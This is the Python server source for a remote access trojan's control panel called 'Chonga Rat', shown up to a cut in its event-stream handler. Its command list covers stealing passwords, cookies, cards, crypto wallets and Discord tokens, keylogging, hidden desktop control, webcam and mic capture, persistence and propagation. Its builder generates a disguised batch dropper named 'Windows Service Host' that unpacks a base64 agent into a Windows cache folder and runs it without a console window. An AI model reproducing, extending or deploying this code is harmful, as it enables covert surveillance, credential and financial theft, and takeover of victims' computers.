#!/usr/bin/env python3
"""
Chonga Rat local panel server.

Hard constraints, enforced in code rather than by convention:

  * HTTP binds 127.0.0.1 by default (PANEL_BIND overrides it for LAN use).
  * Agent listener binds 127.0.0.1 by default (AGENT_BIND overrides it).
  * Any number of agents can be attached at once. Each one gets a stable
    client id, its own command queue and its own feature set. Reconnecting
    with the same id replaces the previous socket instead of duplicating.
  * The agent host comes from the builder config (default 127.0.0.1).
  * Every request must present an allow-listed Host header; cross-origin
    browser requests are rejected (DNS-rebinding guard).
  * Commands are an allowlist. The panel never fetches a payload from the
    network; code pushed to an agent comes from the operator's own request and
    only works if the build enabled the plugins module.

Run:  python server/panel-server.py
"""
from __future__ import annotations

import base64
import hashlib
import json
import os
import queue
import re
import secrets
import shutil
import socket
import subprocess
import sys
import threading
import time
import zipfile
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from urllib.parse import parse_qs, unquote, urlparse

ROOT = Path(__file__).resolve().parent.parent
PANEL = ROOT / "panel"
RUNTIME = ROOT / "runtime"
BUILDS = RUNTIME / "builds"
UPLOADS = RUNTIME / "uploads"
DOWNLOADS = RUNTIME / "downloads"
AGENT_TEMPLATE = ROOT / "agent" / "agent-template.py"

for d in (RUNTIME, BUILDS, UPLOADS, DOWNLOADS):
    d.mkdir(parents=True, exist_ok=True)

HTTP_BIND = os.environ.get("PANEL_BIND", "127.0.0.1").strip() or "127.0.0.1"
AGENT_BIND = os.environ.get("AGENT_BIND", "127.0.0.1").strip() or "127.0.0.1"
HTTP_PORT = int(os.environ.get("PANEL_PORT", "8787"))
AGENT_PORT = int(os.environ.get("AGENT_PORT", "8790"))
TOKEN_FILE = RUNTIME / "token.txt"
MAX_BODY = 512 * 1024 * 1024          # 512 MB upload cap
MAX_AGENT_FRAME = 32 * 1024 * 1024    # 32 MB single agent frame
CHUNK = 256 * 1024


def is_loopback(ip: str) -> bool:
    return ip in ("127.0.0.1", "::1") or ip.startswith("127.")


def local_ips() -> list[str]:
    """Every IPv4 address this host answers on, LAN first, loopback last."""
    found: list[str] = []
    try:
        for info in socket.getaddrinfo(socket.gethostname(), None, socket.AF_INET):
            ip = info[4][0]
            if ip not in found:
                found.append(ip)
    except OSError:
        pass
    try:
        probe = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            probe.connect(("8.8.8.8", 80))   # picks the default route, sends nothing
            ip = probe.getsockname()[0]
        finally:
            probe.close()
        if ip not in found:
            found.append(ip)
    except OSError:
        pass
    lan = [ip for ip in found if not is_loopback(ip)]
    return lan + [ip for ip in found if is_loopback(ip)]


LOCAL_IPS = local_ips()
LAN_IP = next((ip for ip in LOCAL_IPS if not is_loopback(ip)), "127.0.0.1")
LAN_ENABLED = not is_loopback(HTTP_BIND)
# The builder never guesses a target address: the field starts at loopback and
# the operator types the address an agent should dial.
DEFAULT_AGENT_HOST = "127.0.0.1"

ALLOWED_COMMANDS = {
    "ping", "sysinfo", "disconnect",
    # screen / input / windows
    "screenshot", "monitors", "mouse", "key", "windows", "idle", "mask", "lift",
    "mask_status",
    # files / processes / shell / registry
    "drives", "listdir", "stat", "mkdir", "rename", "delete", "file_read",
    "file_write", "file_close", "file_hash", "file_search",
    "processes", "process_kill", "process_start",
    "shell", "execute", "run_command", "registry",
    # clipboard / keylog / audio / tts / power / messagebox / chat
    "clipboard_get", "clipboard_set",
    "keylog_start", "keylog_stop", "keylog_dump",
    "audio", "play_audio", "stop_audio", "tts", "power", "messagebox",
    "chat", "chat_send", "chat_close",
    # HVNC
    "hvnc_start", "hvnc_stop", "hvnc_status", "hvnc_windows",
    "hvnc_processes", "hvnc_start_process", "hvnc_kill_process",
    "hvnc_frame", "hvnc_input", "hvnc_clipboard",
    # capture
    "webcam_list", "webcam_frame", "webcam_stop",
    "mic_list", "mic_capture", "desktop_audio",
    # stealer
    "steal_cookies", "steal_history", "steal_autofill", "steal_passwords",
    "steal_cards", "steal_downloads", "steal_bookmarks", "steal_firefox",
    "steal_discord", "steal_roblox", "steal_wallets", "steal_extensions",
    "steal_archive", "steal_all",
    # recon / persistence / propagation
    "connections", "geo", "startup_list", "startup_add", "startup_remove",
    "persist_status", "persist_install", "persist_remove",
    "recycle_list", "recycle_restore", "vs_infect", "vs_clean",
    # proxy / plugins / code / rustdesk / clipper / control
    "proxy_open", "proxy_send", "proxy_recv", "proxy_close", "proxy_list",
    "proxy_start", "proxy_stop", "proxy_status",
    "plugin_load", "plugin_list", "plugin_call", "plugin_unload", "code_run",
    "visit_website",
    "rustdesk_status", "rustdesk_install", "rustdesk_configure", "rustdesk_launch",
    "clipper_start", "clipper_stop", "clipper_hits",
    "set_status", "set_user_status", "purge", "retry", "close_connection",
    "bot_kill",
}


def load_token() -> str:
    if TOKEN_FILE.exists():
        t = TOKEN_FILE.read_text(encoding="utf-8").strip()
        if len(t) >= 32:
            return t
    t = secrets.token_hex(32)
    TOKEN_FILE.write_text(t, encoding="utf-8")
    try:
        os.chmod(TOKEN_FILE, 0o600)
    except OSError:
        pass
    return t


TOKEN = load_token()


# --------------------------------------------------------------------------
# agent hub — many clients, one panel
# --------------------------------------------------------------------------
class Client:
    """One attached agent socket."""

    def __init__(self, cid: str, conn: socket.socket, peer: str, hello: dict) -> None:
        self.id = cid
        self.conn = conn
        self.peer = peer
        self.info: dict = hello.get("info", {}) or {}
        self.features: list[str] = hello.get("features", []) or []
        self.connected_at = time.time()
        self.last_seen = time.time()
        self.pending: dict[int, queue.Queue] = {}
        self.next_id = 1
        self.send_lock = threading.Lock()

    def close(self) -> None:
        try:
            self.conn.shutdown(socket.SHUT_RDWR)
        except OSError:
            pass
        try:
            self.conn.close()
        except OSError:
            pass

    def public(self) -> dict:
        return {
            "id": self.id,
            "peer": self.peer,
            "info": self.info,
            "features": self.features,
            "connectedAt": self.connected_at,
            "lastSeen": self.last_seen,
        }


class Hub:
    def __init__(self) -> None:
        self.lock = threading.RLock()
        self.clients: dict[str, Client] = {}
        self.subscribers: set[queue.Queue] = set()
        self.log: list[dict] = []

    # ---- events ---------------------------------------------------------
    def publish(self, ev: dict) -> None:
        ev = dict(ev)
        ev.setdefault("ts", time.time())
        with self.lock:
            self.log.append(ev)
            if len(self.log) > 500:
                del self.log[:200]
            subs = list(self.subscribers)
        for q in subs:
            try:
                q.put_nowait(ev)
            except queue.Full:
                pass

    def subscribe(self) -> queue.Queue:
        q: queue.Queue = queue.Queue(maxsize=500)
        with self.lock:
            self.subscribers.add(q)
        return q

    def unsubscribe(self, q: queue.Queue) -> None:
        with self.lock:
            self.subscribers.discard(q)

    # ---- registry -------------------------------------------------------
    def add(self, client: Client) -> None:
        old = None
        with self.lock:
            old = self.clients.get(client.id)
            self.clients[client.id] = client
        if old is not None and old is not client:
            log(f"client {client.id} reconnected, replacing the previous socket")
            old.close()
        self.publish({"type": "agent_connected", "client": client.id,
                      "info": client.info, "features": client.features,
                      "peer": client.peer})
        log(f"client {client.id} connected from {client.peer}: "
            f"{client.info.get('hostname', '?')} "
            f"({len(self.clients)} attached)")

    def remove(self, client: Client) -> None:
        with self.lock:
            if self.clients.get(client.id) is not client:
                return          # superseded by a reconnect; keep the new one
            self.clients.pop(client.id, None)
            pending = list(client.pending.values())
            client.pending.clear()
        for q in pending:
            q.put({"__error__": "agent disconnected"})
        self.publish({"type": "agent_disconnected", "client": client.id,
                      "info": client.info})
        log(f"client {client.id} disconnected ({len(self.clients)} attached)")

    def get(self, cid: str | None) -> Client | None:
        with self.lock:
            if cid:
                return self.clients.get(cid)
            if len(self.clients) == 1:
                return next(iter(self.clients.values()))
            return None

    def connected(self) -> bool:
        with self.lock:
            return bool(self.clients)

    def snapshot(self) -> dict:
        with self.lock:
            clients = sorted(self.clients.values(), key=lambda c: c.connected_at)
            return {
                "connected": bool(clients),
                "clients": [c.public() for c in clients],
                "clientCount": len(clients),
                "agentPort": AGENT_PORT,
                "httpPort": HTTP_PORT,
            }

    # ---- request/response ----------------------------------------------
    def request(self, cid: str | None, cmd: str, args: dict | None = None,
                timeout: float = 30.0) -> dict:
        if cmd not in ALLOWED_COMMANDS:
            return {"ok": False, "error": f"command not allowed: {cmd}"}
        client = self.get(cid)
        if client is None:
            with self.lock:
                many = len(self.clients) > 1
            if cid:
                return {"ok": False, "error": f"client {cid} is not connected"}
            return {"ok": False, "error": "select a client first" if many
                    else "no agent connected"}
        with self.lock:
            rid = client.next_id
            client.next_id += 1
            q: queue.Queue = queue.Queue(maxsize=1)
            client.pending[rid] = q
        payload = json.dumps({"id": rid, "cmd": cmd, "args": args or {}}) + "\n"
        try:
            with client.send_lock:
                client.conn.sendall(payload.encode("utf-8"))
        except OSError as e:
            with self.lock:
                client.pending.pop(rid, None)
            return {"ok": False, "error": f"send failed: {e}"}
        try:
            resp = q.get(timeout=timeout)
        except queue.Empty:
            with self.lock:
                client.pending.pop(rid, None)
            return {"ok": False, "error": "timeout"}
        with self.lock:
            client.pending.pop(rid, None)
        if "__error__" in resp:
            return {"ok": False, "error": resp["__error__"]}
        return resp

    def resolve(self, client: Client, msg: dict) -> None:
        rid = msg.get("id")
        with self.lock:
            q = client.pending.get(rid)
        if q is not None:
            try:
                q.put_nowait(msg)
            except queue.Full:
                pass


HUB = Hub()


def client_key(hello: dict, peer: str) -> str:
    """Stable id for an agent: its own generated id, else a host fingerprint."""
    cid = re.sub(r"[^A-Za-z0-9_-]", "", str(hello.get("client_id") or ""))[:32]
    if len(cid) >= 6:
        return cid
    info = hello.get("info") or {}
    raw = "|".join([
        peer, str(info.get("hostname", "")), str(info.get("username", "")),
        str(info.get("domain", "")),
    ])
    return "h" + hashlib.sha1(raw.encode("utf-8")).hexdigest()[:11]


def log(msg: str) -> None:
    print(f"[panel] {msg}", flush=True)


# --------------------------------------------------------------------------
# agent listener
# --------------------------------------------------------------------------
def _reject(f, conn: socket.socket, message: str) -> None:
    """Send a refusal without turning it into an RST.

    Closing a socket that still has unread bytes queued makes Windows send
    RST, which discards the pending reply and leaves the peer with
    ECONNABORTED instead of our error. Write, half-close, drain, then close.
    """
    try:
        f.write((json.dumps({"ok": False, "error": message}) + "\n").encode("utf-8"))
        f.flush()
    except OSError:
        pass
    try:
        conn.shutdown(socket.SHUT_WR)
    except OSError:
        pass
    try:
        conn.settimeout(1.0)
        while conn.recv(4096):
            pass
    except OSError:
        pass
    finally:
        try:
            conn.close()
        except OSError:
            pass


def handle_agent(conn: socket.socket, addr) -> None:
    peer = addr[0]
    if not is_loopback(peer) and is_loopback(AGENT_BIND):
        log(f"rejected non-loopback agent {peer}")
        try:
            conn.sendall(b'{"ok":false,"error":"loopback only"}\n')
        except OSError:
            pass
        conn.close()
        return

    conn.settimeout(30)
    f = conn.makefile("rwb")
    hello: dict = {}
    cid = ""
    try:
        line = f.readline(MAX_AGENT_FRAME)
        if not line:
            conn.close()
            return
        hello = json.loads(line)
        if not secrets.compare_digest(str(hello.get("token", "")), TOKEN):
            log(f"rejected agent {peer}: bad token")
            _reject(f, conn, "bad token")
            return
        cid = client_key(hello, peer)
        try:
            f.write((json.dumps({"ok": True, "welcome": "chonga-rat",
                                 "client": cid}) + "\n").encode("utf-8"))
            f.flush()
        except OSError:
            conn.close()
            return
    except Exception as e:
        log(f"handshake failed: {e}")
        try:
            conn.close()
        except OSError:
            pass
        return

    client = Client(cid, conn, peer, hello)
    HUB.add(client)
    conn.settimeout(None)
    try:
        while True:
            line = f.readline(MAX_AGENT_FRAME)
            if not line:
                break
            try:
                msg = json.loads(line)
            except json.JSONDecodeError:
                continue
            if "id" in msg:
                HUB.resolve(client, msg)
            elif msg.get("event"):
                client.last_seen = time.time()
                if msg.get("client") != cid:
                    msg["client"] = cid
                HUB.publish(msg)
    except Exception as e:
        log(f"agent loop {cid}: {e}")
    finally:
        HUB.remove(client)
        try:
            conn.close()
        except OSError:
            pass


def agent_listener() -> None:
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((AGENT_BIND, AGENT_PORT))
    srv.listen(32)
    scope = "loopback" if is_loopback(AGENT_BIND) else "all interfaces"
    log(f"agent listener on {AGENT_BIND}:{AGENT_PORT} ({scope}, multi-client)")
    while True:
        try:
            conn, addr = srv.accept()
        except OSError:
            break
        threading.Thread(target=handle_agent, args=(conn, addr), daemon=True).start()


# --------------------------------------------------------------------------
# builder
# --------------------------------------------------------------------------
FEATURES = [
    "screen", "input", "files", "processes", "shell", "registry",
    "clipboard", "keylog", "audio", "tts", "power", "messagebox", "chat",
    "windows", "hvnc", "webcam", "mic", "desktop_audio", "stealer", "recon",
    "persistence", "propagation", "proxy", "plugins", "rustdesk", "clipper",
    "control",
]


def build_agent(options: dict) -> dict:
    if not AGENT_TEMPLATE.exists():
        return {"ok": False, "error": "agent/agent-template.py is missing"}
    feats = [f for f in options.get("features", FEATURES) if f in FEATURES]
    rotate = bool(options.get("rotate"))
    exe = bool(options.get("exe"))
    host = re.sub(r"[^A-Za-z0-9_.:-]", "", str(options.get("host") or DEFAULT_AGENT_HOST)) or DEFAULT_AGENT_HOST

    global TOKEN
    if rotate:
        TOKEN = secrets.token_hex(32)
        TOKEN_FILE.write_text(TOKEN, encoding="utf-8")
        log("agent token rotated")

    cfg = {
        "host": host,
        "port": AGENT_PORT,
        "token": TOKEN,
        "features": feats,
        "label": str(options.get("label", "local"))[:48],
    }
    src = AGENT_TEMPLATE.read_text(encoding="utf-8")
    if "__CONFIG__" not in src:
        return {"ok": False, "error": "template has no __CONFIG__ marker"}
    src = src.replace("__CONFIG__", json.dumps(cfg, indent=4))

    stamp = time.strftime("%Y%m%d-%H%M%S")
    out = BUILDS / f"chonga-agent-{stamp}"
    out.mkdir(parents=True, exist_ok=True)
    agent_py = out / "agent.py"
    agent_py.write_text(src, encoding="utf-8")

    # One file, no folder, no companion .py to lose. The batch carries the agent
    # as base64, writes it into a per-user directory on first run, and starts it
    # with pythonw so there is no console window left behind.
    payload = base64.b64encode(src.encode("utf-8")).decode("ascii")
    wrapped = "\n".join(payload[i:i + 120] for i in range(0, len(payload), 120))
    bat = (
        "@echo off\r\n"
        "setlocal EnableExtensions\r\n"
        "title Windows Service Host\r\n"
        "set \"ROOT=%LOCALAPPDATA%\\Microsoft\\Windows\\Caches\"\r\n"
        "if not exist \"%ROOT%\" md \"%ROOT%\" >nul 2>&1\r\n"
        "set \"SCRIPT=%ROOT%\\winsvc.py\"\r\n"
        "if exist \"%SCRIPT%\" del /f /q \"%SCRIPT%\" >nul 2>&1\r\n"
        "powershell -NoProfile -ExecutionPolicy Bypass -Command "
        "\"$t=[IO.File]::ReadAllText('%~f0');$m='@@PAYLOAD@@';$i=$t.LastIndexOf($m);"
        "if($i -lt 0){exit 2};$b=($t.Substring($i+$m.Length) -replace '\\s','');"
        "[IO.File]::WriteAllBytes('%SCRIPT%',[Convert]::FromBase64String($b))\"\r\n"
        "if not exist \"%SCRIPT%\" exit /b 3\r\n"
        "set \"RUN=\"\r\n"
        "if not defined RUN (where pythonw.exe >nul 2>&1 && set \"RUN=pythonw.exe\")\r\n"
        "if not defined RUN (where python.exe >nul 2>&1 && set \"RUN=python.exe\")\r\n"
        "if not defined RUN (where py.exe >nul 2>&1 && set \"RUN=py.exe -3\")\r\n"
        "if not defined RUN exit /b 4\r\n"
        "start \"\" /min %RUN% \"%SCRIPT%\"\r\n"
        "exit /b 0\r\n"
        "@@PAYLOAD@@\r\n"
        + wrapped.replace("\n", "\r\n") + "\r\n"
    )
    (out / "agent.bat").write_text(bat, encoding="ascii", newline="")

    (out / "config.json").write_text(json.dumps(cfg, indent=2), encoding="utf-8")
    (out / "README.txt").write_text(
        "Chonga Rat agent\r\n"
        "================\r\n\r\n"
        f"Panel       : {cfg['host']}:{cfg['port']}\r\n"
        f"Token       : {cfg['token'][:12]}...\r\n"
        f"Features    : {', '.join(feats)}\r\n\r\n"
        "agent.bat is the whole build. Double-click it on the target and it\r\n"
        "unpacks itself and starts. Nothing else has to travel with it.\r\n\r\n"
        "It needs a Python 3 on the target; the batch looks for pythonw,\r\n"
        "python, then the py launcher, in that order.\r\n\r\n"
        f"Panel URL   : http://{cfg['host']}:{HTTP_PORT}/\r\n"
        "The agent dials the host above, so a machine on another PC needs the\r\n"
        "panel's LAN address there and AGENT_BIND=0.0.0.0 on the panel side.\r\n",
        encoding="utf-8", newline="",
    )

    if exe:
        try:
            proc = subprocess.run(
                [sys.executable, "-m", "PyInstaller", "--noconfirm", "--onefile",
                 "--noconsole", "--name", "agent", str(agent_py)],
                cwd=str(out), capture_output=True, text=True, timeout=300,
            )
            built = out / "dist" / ("agent.exe" if os.name == "nt" else "agent")
            if proc.returncode != 0 or not built.exists():
                (out / "build-error.txt").write_text(
                    (proc.stderr or "") + "\n" + (proc.stdout or ""), encoding="utf-8")
            else:
                shutil.copy2(built, out / "agent.exe")
        except Exception as e:
            (out / "build-error.txt").write_text(str(e), encoding="utf-8")

    zpath = BUILDS / f"{out.name}.zip"
    with zipfile.ZipFile(zpath, "w", zipfile.ZIP_DEFLATED) as z:
        z.write(out / "agent.bat", "agent.bat")
    return {
        "ok": True,
        "file": zpath.name,
        "url": f"/api/builds/{zpath.name}",
        "bat": "agent.bat",
        "batUrl": f"/api/builds/{out.name}/agent.bat",
        "host": host,
        "token": TOKEN[:12] + "...",
        "features": feats,
        "exe": bool(exe and (out / "agent.exe").exists()),
        "exeError": (out / "build-error.txt").read_text(encoding="utf-8")[:400]
        if (out / "build-error.txt").exists() else None,
    }


# --------------------------------------------------------------------------
# HTTP
# --------------------------------------------------------------------------
MIME = {
    ".html": "text/html; charset=utf-8",
    ".css": "text/css; charset=utf-8",
    ".js": "text/javascript; charset=utf-8",
    ".json": "application/json; charset=utf-8",
    ".svg": "image/svg+xml",
    ".png": "image/png",
    ".jpg": "image/jpeg",
    ".ico": "image/x-icon",
    ".md": "text/markdown; charset=utf-8",
    ".zip": "application/zip",
    ".txt": "text/plain; charset=utf-8",
    ".bat": "application/octet-stream",
    ".py": "text/plain; charset=utf-8",
    ".json": "application/json; charset=utf-8",
}


def _allowed_hosts() -> set[str]:
    """Host headers this panel answers to (rebinding guard, LAN-aware)."""
    hosts = {"127.0.0.1", "localhost", "::1"}
    hosts.update(ip.lower() for ip in LOCAL_IPS)
    hosts.add(HTTP_BIND.lower())
    try:
        hosts.add(socket.gethostname().lower())
    except OSError:
        pass
    return hosts


ALLOWED_HOSTS = _allowed_hosts()


class Handler(BaseHTTPRequestHandler):
    server_version = "chonga-rat"
    protocol_version = "HTTP/1.0"

    # ---- guards ---------------------------------------------------------
    def _guard(self) -> bool:
        ip = self.client_address[0]
        if not is_loopback(ip) and is_loopback(HTTP_BIND):
            self._json({"ok": False, "error": "loopback only"}, 403)
            return False
        host = (self.headers.get("Host") or "").split(":")[0].strip("[]").lower()
        if host not in ALLOWED_HOSTS:
            self._json({"ok": False, "error": "invalid host"}, 403)
            return False
        origin = self.headers.get("Origin")
        if origin:
            o = urlparse(origin).hostname or ""
            if o not in ALLOWED_HOSTS:
                self._json({"ok": False, "error": "cross-origin blocked"}, 403)
                return False
        return True

    def _token_ok(self) -> bool:
        """Only /api/* is gated. Static panel files are public to loopback so
        the page can boot; the token itself is handed out by /api/config,
        which a cross-origin page cannot read."""
        if not self.path.startswith("/api/"):
            return True
        if self.path.startswith("/api/config"):
            return True
        supplied = self.headers.get("X-Panel-Token", "")
        if not supplied:
            supplied = parse_qs(urlparse(self.path).query).get("token", [""])[0]
        return secrets.compare_digest(supplied, TOKEN)

    # ---- helpers --------------------------------------------------------
    def _json(self, obj, code: int = 200) -> None:
        body = json.dumps(obj).encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.send_header("X-Content-Type-Options", "nosniff")
        self.end_headers()
        self.wfile.write(body)

    def _mjpeg(self, cid: str, command: str, args: dict, fps: int) -> None:
        """Continuous JPEG stream. The browser reads parts; one thread per view."""
        if HUB.get(cid) is None:
            self._json({"ok": False, "error": "select a client first"}, 503)
            return
        self.send_response(200)
        self.send_header("Content-Type", "multipart/x-mixed-replace; boundary=frame")
        self.send_header("Cache-Control", "no-store, no-cache, must-revalidate")
        self.send_header("Pragma", "no-cache")
        self.send_header("Connection", "close")
        self.end_headers()
        self.close_connection = True
        period = 1.0 / max(1, fps)
        last_seq = -1
        last_write = time.monotonic()
        while True:
            t0 = time.monotonic()
            r = HUB.request(cid, command, args, timeout=5)
            if not r.get("ok"):
                time.sleep(0.25)
                continue
            data = r.get("data") or {}
            seq = int(data.get("seq") or 0)
            # hvnc_frame hands back whatever the capture thread produced last.
            # Repeats are dropped so the wire carries motion, not duplicates.
            if command == "hvnc_frame" and seq == last_seq:
                if time.monotonic() - last_write > 1.0:
                    try:
                        self.wfile.write(b"--frame\r\nContent-Length: 0\r\n\r\n")
                        self.wfile.flush()
                        last_write = time.monotonic()
                    except (BrokenPipeError, ConnectionResetError, OSError):
                        break
                # the capture thread runs at the requested rate; poll at that
                # rate instead of spinning on the socket
                time.sleep(min(period, 0.05))
                continue
            try:
                raw = base64.b64decode(data.get("jpeg") or "")
            except Exception:
                raw = b""
            if not raw:
                time.sleep(0.08)
                continue
            head = (
                "--frame\r\n"
                "Content-Type: image/jpeg\r\n"
                "Content-Length: %d\r\n"
                "X-Frame-Width: %d\r\n"
                "X-Frame-Height: %d\r\n"
                "X-Frame-Seq: %d\r\n\r\n"
                % (len(raw), int(data.get("width") or 0),
                   int(data.get("height") or 0), seq)
            )
            try:
                self.wfile.write(head.encode("ascii"))
                self.wfile.write(raw)
                self.wfile.write(b"\r\n")
                self.wfile.flush()
            except (BrokenPipeError, ConnectionResetError, OSError):
                break
            last_seq = seq
            last_write = time.monotonic()
            rest = period - (time.monotonic() - t0)
            if rest > 0:
                time.sleep(rest)

    def _file(self, path: Path, download: str | None = None) -> None:
        if not path.is_file():
            self._json({"ok": False, "error": "not found"}, 404)
            return
        size = path.stat().st_size
        self.send_response(200)
        self.send_header("Content-Type", MIME.get(path.suffix.lower(), "application/octet-stream"))
        self.send_header("Content-Length", str(size))
        self.send_header("Cache-Control", "no-store")
        if download:
            self.send_header("Content-Disposition", f'attachment; filename="{download}"')
        self.end_headers()
        with open(path, "rb") as fh:
            while True:
                chunk = fh.read(CHUNK)
                if not chunk:
                    break
                self.wfile.write(chunk)

    # ---- routes ---------------------------------------------------------
    def do_GET(self) -> None:
        if not self._guard():
            return
        u = urlparse(self.path)
        p = unquote(u.path)
        if p == "/api/config":
            self._json({
                "token": TOKEN,
                "httpPort": HTTP_PORT,
                "agentPort": AGENT_PORT,
                "bind": HTTP_BIND,
                "agentBind": AGENT_BIND,
                "lanIp": LAN_IP,
                "lan": LAN_ENABLED,
                "multiClient": True,
            })
            return
        if not self._token_ok():
            self._json({"ok": False, "error": "bad token"}, 403)
            return
        if p == "/api/state":
            st = HUB.snapshot()
            st["ok"] = True
            self._json(st)
            return
        if p == "/api/events":
            self._events()
            return
        if p == "/api/stream" or p == "/api/hvnc":
            q = parse_qs(u.query)
            cid = q.get("client", [""])[0]
            try:
                quality = max(20, min(92, int(q.get("q", ["58"])[0])))
                fps = max(1, min(60, int(q.get("fps", ["30"])[0])))
                scale = max(0.25, min(1.0, float(q.get("s", ["1"])[0])))
            except (TypeError, ValueError):
                quality, fps, scale = 58, 30, 1.0
            if p == "/api/hvnc":
                self._mjpeg(cid, "hvnc_frame", {"quality": quality, "fps": fps}, fps)
            else:
                try:
                    monitor = max(0, min(8, int(q.get("m", ["0"])[0])))
                except (TypeError, ValueError):
                    monitor = 0
                self._mjpeg(cid, "screenshot",
                            {"quality": quality, "monitor": monitor,
                             "scale": round(scale, 3)}, fps)
            return
        if p == "/api/screen":
            q = parse_qs(u.query)
            cid = q.get("client", [""])[0]
            try:
                quality = max(10, min(95, int(q.get("q", ["65"])[0])))
                monitor = max(0, min(8, int(q.get("m", ["0"])[0])))
            except (TypeError, ValueError):
                quality, monitor = 65, 0
            r = HUB.request(cid, "screenshot", {"quality": quality, "monitor": monitor}, timeout=20)
            if not r.get("ok"):
                self._json({"ok": False, "error": r.get("error", "capture failed")}, 503)
                return
            raw = base64.b64decode(r["data"]["jpeg"])
            self.send_response(200)
            self.send_header("Content-Type", "image/jpeg")
            self.send_header("Content-Length", str(len(raw)))
            self.send_header("Cache-Control", "no-store")
            self.end_headers()
            self.wfile.write(raw)
            return
        if p == "/api/download":
            q = parse_qs(u.query)
            self._download(q.get("path", [""])[0], q.get("client", [""])[0])
            return
        if p.startswith("/api/builds/"):
            rel = p[len("/api/builds/"):].replace("\\", "/").strip("/")
            target = (BUILDS / rel).resolve()
            if BUILDS.resolve() not in target.parents or not target.is_file():
                self._json({"ok": False, "error": "not found"}, 404)
                return
            self._file(target, target.name)
            return
        if p == "/":
            p = "/index.html"
        target = (PANEL / p.lstrip("/")).resolve()
        if PANEL.resolve() not in target.parents and target != PANEL.resolve():
            self._json({"ok": False, "error": "forbidden"}, 403)
            return
        if target.is_dir():
            target = target / "index.html"
        self._file(target)

    def do_HEAD(self) -> None:
        if not self._guard():
            return
        u = urlparse(self.path)
        p = unquote(u.path) or "/index.html"
        target = (PANEL / p.lstrip("/")).resolve()
        if PANEL.resolve() not in target.parents and target != PANEL.resolve():
            self.send_response(403)
            self.end_headers()
            return
        if target.is_dir():
            target = target / "index.html"
        if not target.is_file():
            self.send_response(404)
            self.end_headers()
            return
        self.send_response(200)
        self.send_header("Content-Type", MIME.get(target.suffix.lower(), "application/octet-stream"))
        self.send_header("Content-Length", str(target.stat().st_size))
        self.end_headers()

    def do_POST(self) -> None:
        if not self._guard():
            return
        if not self._token_ok():
            self._json({"ok": False, "error": "bad token"}, 403)
            return
        u = urlparse(self.path)
        p = unquote(u.path)
        if p == "/api/cmd":
            body = self._read_json()
            if body is None:
                return
            if not isinstance(body, dict):
                self._json({"ok": False, "error": "bad request"}, 400)
                return
            cmd = body.get("cmd", "")
            args = body.get("args")
            if args is None:
                args = {}
            if not isinstance(args, dict):
                self._json({"ok": False, "error": "args must be an object"}, 400)
                return
            try:
                timeout = float(body.get("timeout", 30))
            except (TypeError, ValueError):
                timeout = 30.0
            r = HUB.request(body.get("client", ""), cmd, args, timeout=min(timeout, 300))
            self._json(r)
            return
        if p == "/api/upload":
            q = parse_qs(u.query)
            self._upload(q.get("path", [""])[0], q.get("client", [""])[0])
            return
        if p == "/api/builder":
            body = self._read_json()
            if body is None:
                return
            if not isinstance(body, dict):
                self._json({"ok": False, "error": "bad request"}, 400)
                return
            self._json(build_agent(body))
            return
        self._json({"ok": False, "error": "not found"}, 404)

    # ---- bodies ---------------------------------------------------------
    def _read_json(self):
        try:
            n = int(self.headers.get("Content-Length", "0"))
        except ValueError:
            n = 0
        if n <= 0 or n > MAX_AGENT_FRAME:
            self._json({"ok": False, "error": "bad body"}, 400)
            return None
        try:
            return json.loads(self.rfile.read(n).decode("utf-8"))
        except Exception:
            self._json({"ok": False, "error": "bad json"}, 400)
            return None

    def _download(self, remote_path: str, cid: str = "") -> None:
        if not remote_path:
            self._json({"ok": False, "error": "path required"}, 400)
            return
        st = HUB.request(cid, "stat", {"path": remote_path}, timeout=15)
        if not st.get("ok"):
            self._json(st, 404)
            return
        if st["data"].get("dir"):
            self._json({"ok": False, "error": "path is a directory"}, 400)
            return
        size = int(st["data"].get("size", 0))
        if size > 2 * 1024 * 1024 * 1024:
            self._json({"ok": False, "error": "file too large"}, 413)
            return
        name = st["data"].get("name") or Path(remote_path).name or "download.bin"
        tmp = DOWNLOADS / f"{int(time.time())}-{secrets.token_hex(4)}-{Path(name).name}"
        try:
            offset = 0
            with open(tmp, "wb") as fh:
                while offset < size:
                    r = HUB.request(cid, "file_read", {"path": remote_path, "offset": offset,
                                                       "length": CHUNK}, timeout=60)
                    if not r.get("ok"):
                        self._json(r, 500)
                        return
                    blob = base64.b64decode(r["data"]["data"])
                    if not blob:
                        break
                    fh.write(blob)
                    offset += len(blob)
            self._file(tmp, name)
        finally:
            try:
                tmp.unlink(missing_ok=True)
            except OSError:
                pass

    def _upload(self, dest: str, cid: str = "") -> None:
        if not dest:
            self._json({"ok": False, "error": "path required"}, 400)
            return
        if HUB.get(cid) is None:
            self._json({"ok": False, "error": "select a client first"}, 503)
            return
        try:
            n = int(self.headers.get("Content-Length", "0"))
        except ValueError:
            n = 0
        if n <= 0 or n > MAX_BODY:
            self._json({"ok": False, "error": "bad or oversized body"}, 400)
            return
        tmp = UPLOADS / f"{int(time.time())}-{secrets.token_hex(4)}.bin"
        remaining = n
        try:
            with open(tmp, "wb") as fh:
                while remaining > 0:
                    chunk = self.rfile.read(min(CHUNK, remaining))
                    if not chunk:
                        break
                    fh.write(chunk)
                    remaining -= len(chunk)
            if remaining != 0:
                self._json({"ok": False, "error": "incomplete upload"}, 400)
                return

            offset = 0
            failure = None
            with open(tmp, "rb") as fh:
                while True:
                    chunk = fh.read(CHUNK)
                    if not chunk:
                        break
                    r = HUB.request(cid, "file_write", {
                        "path": dest, "offset": offset,
                        "data": base64.b64encode(chunk).decode("ascii"),
                        "final": False,
                    }, timeout=60)
                    if not r.get("ok"):
                        failure = r
                        break
                    offset += len(chunk)
            if failure is not None:
                self._json(failure, 500)
                return
            HUB.request(cid, "file_close", {"path": dest, "size": offset}, timeout=20)
            self._json({"ok": True, "path": dest, "size": offset})
        finally:
            try:
                tmp.unlink(missing_ok=True)
            except OSError:
                pass

    # ---- SSE ------------------------------------------------------------
    def _events(self) -> None:
        q = HUB.subscribe()
        self.send_response(200)
        self.send_header("Content-Type", "text/event-stream")
        self.send_header("Cache-Control", "no-store")
